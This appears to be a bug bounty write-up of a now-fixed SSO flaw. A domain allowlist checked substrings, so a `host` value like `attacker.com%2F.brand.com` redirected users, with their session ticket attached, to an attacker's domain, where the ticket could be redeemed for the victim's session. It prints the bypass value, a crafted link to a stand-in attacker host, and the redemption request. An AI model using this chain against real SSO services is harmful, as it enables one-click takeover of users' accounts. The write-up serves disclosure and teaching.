---
title:       "One-click account takeover: the SSO open redirect handed over the session ticket"
summary:     "An SSO `host` parameter accepted foreign domains if you stuck a slash in the right place. What went to the attacker's domain was not the user — it was their session ticket. One click and the account changes hands."
date:        2026-10-18 12:05:00 +0100
lang:        en
ref:         open-redirect-sso-ticket
image:       /assets/img/og/open-redirect-sso-ticket-en.png
permalink:   /en/writeups/open-redirect-sso-session-ticket/

severity:    high
cvss:        "8.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
cwe:         "CWE-601 · CWE-287"
vuln_class:  "Authentication"
target_type: "Web SSO"
platform:    "YesWeHack"
status:      "Fixed"
tags:        [open-redirect, sso, ato, session, cookies, allowlist-bypass]

takeaways:
  - "An open redirect on its own is worth little. An open redirect that carries a credential in the URL is worth an account."
  - "Comparing domains as text is the mistake: `attacker.com/.brand.com` **contains** `.brand.com` and has nothing to do with it."
  - "Before celebrating, check the parameter really is validated: if an invalid value is rejected and yours gets through, you found a bypass, not an open field."
  - "The ticket must be bound to the destination that requested it. If it works anywhere, anywhere can spend it."
---

An SSO takes the place to send you back to after login as a URL parameter:

```
https://sso.example.tld/doLogin?host=app.example.tld
```

That parameter is written by whoever makes the link, and whoever makes the link can be
anyone. The first thing I tried was my own domain: **rejected**, with an internal error
code. Good news: there is a check, and a check can be studied.

## What rule it applied

The most common way to validate a domain, and the most broken, is to ask whether the string
ends in `.brand.com` or — worse — whether it contains it. It fails because a URL is not a
string: the browser decides the destination from whatever comes **before the first slash**.

| Parameter value | What the check sees | Where the browser lands |
|---|---|---|
| `app.brand.com` | contains `.brand.com` ✅ | `app.brand.com` ✅ |
| `attacker.com/.brand.com` | contains `.brand.com` ✅ | **`attacker.com`** ⚠ |
| `attacker.com%2F.brand.com` | once decoded, the same | **`attacker.com`** ⚠ |

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/02-anatomia-url-en.svg' | relative_url }}"
       alt="Diagram of a URL: the destination server is whatever comes before the first slash, the rest is the path; the text check looks at the whole string">
  <figcaption>The browser cuts at the first slash. The check looks at the whole string. That is the gap.</figcaption>
</figure>

`attacker.com/.brand.com` is a page called `.brand.com` on the attacker's server. The check
waves it through because the string contains what it is looking for. The `%2F` is that same
slash written in URL encoding: the server decodes it before comparing, which slips it past
validation that would have rejected a literal slash.

```
https://sso.example.tld/doLogin?host=attacker-example.com%2F.brand-example.com
```

Accepted.

## What left with the redirect

A plain open redirect is not much. What turns this into something else is that the SSO
appended a **session ticket** to the return URL: a one-shot string the application redeems
to obtain the user's cookies.

```
https://attacker-example.com/.brand-example.com?ticket=a1b2c3d4e5f6...
```

The attacker owns that server, so they read it in their own access log.

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/01-ticket-al-atacante.png' | relative_url }}"
       alt="Top: the login request with the host parameter set to atk.example.com%2F. followed by the victim domain, redacted. Bottom: the server response, whose redirectUrl field points at atk.example.com and carries the au= ticket in the URL">
  <figcaption>Top, what I sent; bottom, what the server answered. The <code>redirectUrl</code> points at the attacker domain with the <code>au=</code> ticket attached. Two excerpts of the same exchange, with the host, the account and the victim domain covered.</figcaption>
</figure>

## One click

If the victim already has a session open — the normal case — no login screen appears at
all: the SSO sees the cookies, takes the identity as given and issues the ticket straight
away. One click on a link whose visible domain is the vendor's, no password typed, nothing
that looks wrong.

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/03-cadena-en.svg' | relative_url }}"
       alt="Diagram of the five steps: the victim opens the link, the SSO issues the ticket without asking for a password, the redirect carries it to the attacker's domain, who reads it in their log and redeems it from a clean session">
  <figcaption>Five steps and one action by the victim. What travels in the redirect is a credential.</figcaption>
</figure>

## Redeeming it

From a clean session: different browser, different machine, no cookie at all.

```http
GET /auth?ticket=a1b2c3d4e5f6... HTTP/2
Host: api.example.tld
```

```http
HTTP/2 200 OK
set-cookie: SESSION_ID=...;  USER_ID=...;  USERNAME=...
```

The ticket alone produced the victim's session. To show what it opens I made a single read,
the user's own profile, and it returned their personal data in the clear, full email address
included — while the interface shows it masked. That is where I stopped.

## A bonus

One of the cookies set on redemption carried **the same session identifier in the clear**
and, unlike the main one, without `HttpOnly`. Protecting the first one is pointless: any
script reads it from the other.

## Impact

<div class="impact" markdown="1">
**Impact.** Full account takeover from **a single click** by the victim, on a link whose
visible domain is the vendor's legitimate one. The attacker obtains the complete session:
unmasked personal data, email, user id and access to whatever else that session reaches. No
password, no second factor, and nothing for the victim to fill in.
</div>
